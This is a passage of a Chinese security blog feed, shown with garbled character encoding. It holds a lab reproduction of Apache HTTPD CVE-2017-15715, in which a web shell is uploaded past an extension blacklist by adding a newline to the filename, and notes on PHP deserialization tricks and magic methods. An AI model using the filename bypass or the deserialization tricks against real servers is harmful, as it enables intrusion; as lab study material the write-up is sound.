    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
    <content><![CDATA[<p>ä¸ªäººçš„æ¼æ´å¤ç°ç»ƒä¹ ï¼Œè¯·å¤šæ‰¹è¯„ï¼</p>
<span id="more"></span>
<h1 id="æ¼æ´ä¿¡æ¯">æ¼æ´ä¿¡æ¯</h1>
<p>Apache HTTPDæ˜¯ä¸€æ¬¾HTTPæœåŠ¡å™¨ï¼Œå®ƒå¯ä»¥é€šè¿‡mod_phpæ¥è¿è¡ŒPHPç½‘é¡µã€‚å…¶<strong>2.4.0~2.4.29ç‰ˆæœ¬</strong>ä¸­å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æPHPæ—¶ï¼Œ<code>1.php\x0A</code>å°†è¢«æŒ‰ç…§PHPåç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚</p>
<p>Pathï¼šhttps://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
<p>è¿è¡Œæ¼æ´ç¯å¢ƒï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
<p>ç„¶åè¾“å…¥ï¼š<code>http://ip:8080</code> å³å¯è®¿é—®</p>
<h1 id="å¤ç°">å¤ç°</h1>
<p>ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬ï¼Œå‘ç°è¢«æ‹¦æˆªï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
<p>æ­¤æ—¶ä¿®æ”¹ 24 è¡Œé‚£ï¼Œé¦–å…ˆæ·»åŠ ä¸€ä¸ªå­—ç¬¦ï¼Œç„¶åé€‰å®šï¼Œæ­¤æ—¶å³è¾¹ä¼šæœ‰ç¼–ç çš„åŒºåŸŸã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
<p>åœ¨ code é‚£å—å†™ä¸Š 0aï¼ˆasciiç è¡¨çš„æ¢è¡Œç¬¦çš„16è¿›åˆ¶ï¼‰ï¼Œç„¶åç‚¹å‡» <code>apply changes</code> ã€‚æ­¤æ—¶å°±åŠ å…¥äº†ä¸€ä¸ªæ¢è¡Œç¬¦ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
<p>ç„¶åå†æ¬¡å‘é€è¯¥æ•°æ®åŒ…ï¼Œæ­¤æ—¶æˆåŠŸå‘é€ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
<p>è®¿é—® <code>http"//ip:8080/shell.php%0a</code>ï¼Œå‘ç°èƒ½å¤Ÿè®¿é—®ï¼Œè¯´æ˜æ–‡ä»¶ä¸Šä¼ æˆåŠŸã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
<p>åˆ©ç”¨èšå‰‘è¿æ¥ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
<p>æˆåŠŸè·å¾— webshellã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æŸ¥çœ‹ä¸€ä¸‹æºç ï¼ˆå…³é”®éƒ¨åˆ†ï¼‰ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>æ¢è¡Œç¬¦ç»•è¿‡äº† <code>in_array()</code> çš„é»‘åå•è¿‡æ»¤ã€‚ä½†æ˜¯ <code>php%0a</code> å¹¶ä¸æ˜¯ <code>php</code> æ–‡ä»¶ï¼Œä¸ä¼šè¢«æ‰§è¡Œï¼Œè¿™å°±è¯æ˜äº†å­˜åœ¨è§£ææ¼æ´ã€‚</p>
<h1 id="èµ„æº">èµ„æº</h1>
<ol type="1">
<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
</ol>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>ååºåˆ—åŒ–çŸ¥è¯†ç‚¹</title>
    <url>/2022/04/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<p>ä¸ªäººæ€»ç»“çš„çŸ¥è¯†ç‚¹ï¼ŒæŒç»­æ›´æ–°ã€‚</p>
<span id="more"></span>
<h1 id="ååºåˆ—åŒ–æ¦‚å¿µç‰¹ç‚¹">1 ååºåˆ—åŒ–æ¦‚å¿µã€ç‰¹ç‚¹</h1>
<h2 id="ååºåˆ—åŒ–æ¦‚å¿µ">1.1 ååºåˆ—åŒ–æ¦‚å¿µ</h2>
<p>åºåˆ—åŒ–å°±æ˜¯å°†å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚å­—ç¬¦ä¸²åŒ…æ‹¬ <strong>å±æ€§å</strong> <strong>å±æ€§å€¼</strong> <strong>å±æ€§ç±»å‹</strong>å’Œ<strong>è¯¥å¯¹è±¡å¯¹åº”çš„ç±»å</strong>ã€‚</p>
<p>ååºåˆ—åŒ–åˆ™ç›¸åå°†å­—ç¬¦ä¸²é‡æ–°æ¢å¤æˆå¯¹è±¡ã€‚</p>
<p>å¯¹è±¡çš„åºåˆ—åŒ–åˆ©äºå¯¹è±¡çš„ä¿å­˜å’Œä¼ è¾“,ä¹Ÿå¯ä»¥è®©å¤šä¸ªæ–‡ä»¶å…±äº«å¯¹è±¡ã€‚</p>
<p>å¦‚ä¸‹ä¾‹å­ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Ctf&quot;</span>:<span class="number">3</span>&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;flag&#123;abedyui&#125;&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Sch0lar&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;18&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">O   ä»£è¡¨å¯¹è±¡ å› ä¸ºæˆ‘ä»¬åºåˆ—åŒ–çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ åºåˆ—åŒ–æ•°ç»„åˆ™ç”¨Aæ¥è¡¨ç¤º</span><br><span class="line"><span class="number">3</span>   ä»£è¡¨ç±»åå­—å ä¸‰ä¸ªå­—ç¬¦ </span><br><span class="line">ctf ç±»å</span><br><span class="line"><span class="number">3</span>   ä»£è¡¨ä¸‰ä¸ªå±æ€§</span><br><span class="line">s   ä»£è¡¨å­—ç¬¦ä¸²</span><br><span class="line"><span class="number">4</span>   ä»£è¡¨å±æ€§åé•¿åº¦</span><br><span class="line">flagå±æ€§å</span><br><span class="line">s:<span class="number">13</span>:<span class="string">&quot;flag&#123;abedyui&#125;&quot;</span> å­—ç¬¦ä¸² å±æ€§å€¼é•¿åº¦ å±æ€§å€¼</span><br></pre></td></tr></table></figure></p>
<h2 id="ååºåˆ—åŒ–ç‰¹ç‚¹">1.2 ååºåˆ—åŒ–ç‰¹ç‚¹</h2>
<ol type="1">
<li><strong>phpåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ <code>;</code> ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ <code>&#125;</code> ä½œä¸ºç»“å°¾ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„ ï¼ŒåŒæ—¶ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¿…é¡»ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–è§„åˆ™æ‰èƒ½æˆåŠŸå®ç°ååºåˆ—åŒ–</strong> ã€‚ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;shy&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$lemon</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$lemon</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">åºåˆ—åŒ–ç»“æœä¸ºï¼š</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>è¶…å‡ºçš„éƒ¨åˆ†ä¸ä¼šè¢«å‘åºåˆ—åŒ–æˆåŠŸï¼Œå¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;shy&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$lemon</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$lemon</span>);</span><br><span class="line">var_dump(unserialize(serialize(<span class="variable">$lemon</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ç»“æœä¸ºï¼š</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;<span class="keyword">object</span>(A)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;shy&quot;</span></span><br><span class="line">  [<span class="string">&quot;pass&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>è¿™è¯´æ˜ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯æœ‰ä¸€å®šè¯†åˆ«èŒƒå›´çš„ï¼Œåœ¨è¿™ä¸ªèŒƒå›´ä¹‹å¤–çš„å­—ç¬¦éƒ½ä¼šè¢«å¿½ç•¥ï¼Œä¸å½±å“ååºåˆ—åŒ–çš„æ­£å¸¸è¿›è¡Œã€‚è€Œä¸”å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–å­—ç¬¦ä¸²éƒ½æ˜¯ä»¥<code>";&#125;</code>ç»“æŸçš„ï¼Œ<strong>é‚£å¦‚æœæŠŠ<code>";&#125;</code>æ·»å…¥åˆ°éœ€è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­ï¼ˆé™¤äº†ç»“å°¾å¤„ï¼‰ï¼Œå°±èƒ½è®©ååºåˆ—åŒ–æå‰é—­åˆç»“æŸï¼Œåé¢çš„å†…å®¹å°±ç›¸åº”çš„ä¸¢å¼ƒäº†</strong>ã€‚</p>
<ol start="2" type="1">
<li><p><strong>é•¿åº¦ä¸å¯¹åº”çš„æ—¶å€™ä¼šæŠ¥é”™</strong> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;shy&quot;;s:4:&quot;pass&quot;;s:6:&quot;12&quot;;&#125;&#x27;</span>;  </span><br><span class="line"><span class="comment">// æ³¨æ„ s:6:&quot;12&quot; æ˜æ˜¾é•¿åº¦ä¸å¤Ÿ</span></span><br><span class="line">var_dump(unserialize(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ç»“æœä¸ºï¼š</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>å¯ä»¥åœ¨ååºåˆ—åŒ–ç±»ä¸­ä¸å­˜åœ¨çš„å…ƒç´ </strong>ã€‚ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;O:1:&quot;A&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;shy&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;s:5:&quot;pass2&quot;;s:4:&quot;1234&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// æ³¨æ„è¦ä¿®æ”¹Aåé¢çš„å€¼ï¼Œè¦ä¸åé¢çš„å±æ€§ä¸ªæ•°å¯¹åº”</span></span><br><span class="line">var_dump(unserialize(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ç»“æœä¸ºï¼šï¼ˆåŸæ¥çš„ç±»ä¸­æ²¡æœ‰pass2è¿™ä¸ªå±æ€§ï¼‰</span><br><span class="line"><span class="keyword">object</span>(<span class="built_in">__PHP_Incomplete_Class</span>)<span class="comment">#1 (4) &#123;</span></span><br><span class="line">  [<span class="string">&quot;__PHP_Incomplete_Class_Name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;shy&quot;</span></span><br><span class="line">  [<span class="string">&quot;pass&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;123456&quot;</span></span><br><span class="line">  [<span class="string">&quot;pass2&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;1234&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h1 id="å¸¸è§çš„é­”æœ¯æ–¹æ³•">2 å¸¸è§çš„é­”æœ¯æ–¹æ³•</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct() åˆ›å»ºå¯¹è±¡æ—¶è°ƒç”¨</span><br><span class="line">__destruct() é”€æ¯å¯¹è±¡æ—¶è°ƒç”¨</span><br><span class="line">__toString() å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨</span><br><span class="line">__sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span><br><span class="line">__wakeup å°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨</span><br></pre></td></tr></table></figure>
<p>PHPå°†æ‰€æœ‰ä»¥Â <strong><strong><strong>Â ï¼ˆä¸¤ä¸ªä¸‹åˆ’çº¿ï¼‰å¼€å¤´çš„ç±»æ–¹æ³•ä¿ç•™ä¸ºé­”æœ¯æ–¹æ³•ã€‚æ‰€ä»¥åœ¨å®šä¹‰ç±»æ–¹æ³•æ—¶ï¼Œé™¤äº†ä¸Šè¿°é­”æœ¯æ–¹æ³•ï¼Œå»ºè®®ä¸è¦ä»¥Â </strong></strong></strong>Â ä¸ºå‰ç¼€ã€‚</p>
<h2 id="sleep">2.1 <code>__sleep()</code></h2>
<p>åœ¨ä½¿ç”¨ <code>serialize()</code> å‡½æ•°æ—¶ï¼Œç¨‹åºä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ª <code>__sleep()</code> é­”æœ¯æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™è¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åå†æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚</p>
<h2 id="wakeup">2.2 <code>__wakeup</code></h2>
<p>åœ¨ä½¿ç”¨ <code>unserialize()</code> æ—¶ï¼Œä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª <code>__wakeup()</code>é­”æœ¯æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™è¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚ï¼ˆæ³¨æ„ä¸ <code>__sleep()</code> å¯¹æ¯”ï¼‰</p>
<h2 id="tostring">2.3 <code>__toString</code></h2>
<p><code>__toString()</code> æ–¹æ³•ç”¨äºå®šä¹‰ä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶è¯¥å¦‚ä½•å¤„ç†ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$foo</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$foo</span></span>) 										 	      </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;foo = <span class="variable">$foo</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;foo;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> TestClass(<span class="string">&#x27;Hello&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è§£é‡Šï¼š</p>
<p>è¿™é‡Œ<code>echo $class;</code>æŠŠä¸€ä¸ªç±»å¯¹è±¡å½“ä½œå­—ç¬¦ä¸²å˜é‡æ‰“å°ï¼Œå› æ­¤æ‰§è¡Œäº†<code>__toSting()</code>ï¼Œç„¶åè¿”å›<code>$this-&gt;foo</code>ï¼Œå³Helloã€‚</p>
<h2 id="invoke">2.4<code>__invoke</code></h2>
<p>å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ<code>__invoke()</code> æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚(æœ¬ç‰¹æ€§åªåœ¨ PHP 5.3.0 åŠä»¥ä¸Šç‰ˆæœ¬æœ‰æ•ˆã€‚)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CallableClass</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">        var_dump(<span class="variable">$x</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> CallableClass();</span><br><span class="line"><span class="variable">$obj</span>(<span class="number">5</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è§£é‡Šï¼š</p>
<p>ç›´æ¥å°†ç±»å¯¹è±¡å½“ä½œä¸€ä¸ªå‡½æ•°ä½¿ç”¨ï¼Œä»è€Œç›´æ¥è°ƒç”¨äº†<code>__invoke()</code>æ–¹æ³•ï¼Œæ‰€ä»¥è¿”å›ç»“æœä¸º<code>int(5)</code></p>
<h2 id="construct">2.5 <code>__construct()</code></h2>
<p>å…·æœ‰<code>__construct()</code>å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œé€‚åˆåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰åšä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚</p>
<h2 id="destruct">2.6 <code>__destruct()</code></h2>
<p><code>__destruct</code>å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œ</p>
<h2 id="set">2.7 <code>__set()</code></h2>
<p>ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ<code>__set()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
<h2 id="get">2.8 <code>__get()</code></h2>
<p>è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ<code>__get()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
<h2 id="isset">2.9 <code>__isset()</code></h2>
<p>å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <code>__isset()</code> æˆ– <code>empty()</code> æ—¶ï¼Œ<code>__isset()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
<h2 id="unset">2.10 <code>__unset()</code></h2>
<p>å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <code>unset()</code>æ—¶ï¼Œ<code>__unset()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
<h2 id="callstatic">2.10 <code>__callStatic()</code></h2>
<p>åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<code>__callStatic()</code> ä¼šè¢«è°ƒç”¨ã€‚ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MethodTest</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">Note:</span> value of $name is case sensitive.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Triggering __call method when calling  method &#x27;<span class="subst">$name</span>&#x27; with arguments &#x27;&quot;</span> . implode(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>). <span class="string">&quot;&#x27;.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MethodTest::callStaticTest(<span class="string">&#x27;arg3&#x27;</span>,<span class="string">&#x27;arg4&#x27;</span>);  <span class="comment">// As of PHP 5.3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*è¿è¡Œç»“æœ</span></span><br><span class="line"><span class="comment">Triggering __call method when calling  method &#x27;callStaticTest&#x27; with arguments &#x27;arg3, arg4&#x27;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="call">2.11 <code>__call()</code></h2>
<p>åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<code>__call()</code> ä¼šè¢«è°ƒç”¨ã€‚ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MethodTest</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">Note:</span> value of $name is case sensitive.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Triggering __call method when calling  method &#x27;<span class="subst">$name</span>&#x27; with arguments &#x27;&quot;</span> . implode(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>). <span class="string">&quot;&#x27;.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> MethodTest;</span><br><span class="line"><span class="variable">$obj</span>-&gt;callTest(<span class="string">&#x27;arg1&#x27;</span>,<span class="string">&#x27;arg2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*è¿è¡Œç»“æœ</span></span><br><span class="line"><span class="comment">Triggering __call method when calling  method &#x27;callTest&#x27; with arguments &#x27;arg1, arg2&#x27;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦">3 è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦</h1>
<p>æ ¹æ®è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦çš„ä¸åŒï¼Œåºåˆ—åŒ–åçš„ <strong>å±æ€§é•¿åº¦</strong> å’Œ <strong>å±æ€§å€¼</strong> ä¼šæœ‰æ‰€ä¸åŒã€‚ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>(å…¬æœ‰)</span><br><span class="line"><span class="keyword">protected</span>(å—ä¿æŠ¤)</span><br><span class="line"><span class="keyword">private</span>(ç§æœ‰çš„)</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> å±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§åä¼šå˜æˆï¼š%<span class="number">00</span>*%<span class="number">00</span>å±æ€§å</span><br><span class="line"><span class="keyword">private</span> å±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§åä¼šå˜æˆï¼š%<span class="number">00</span>ç±»å%<span class="number">00</span>å±æ€§å</span><br><span class="line"></span><br><span class="line">æ³¨æ„ï¼šè¿™é‡Œçš„%<span class="number">00</span>å…¶å®æ˜¯\<span class="number">0</span>ç»è¿‡urlencodeå¾—åˆ°çš„ï¼Œè€Œ\<span class="number">0</span>é•¿åº¦æ˜¯<span class="number">1</span>ï¼Œæ‰€ä»¥%<span class="number">00</span>çš„é•¿åº¦ä¹Ÿæ˜¯<span class="number">1</span>ï¼Œåˆ‡è®°ï¼ï¼ï¼å¯ä»¥æ•°ä¸‹é¢ä¾‹å­çš„é•¿åº¦ã€‚</span><br></pre></td></tr></table></figure></p>
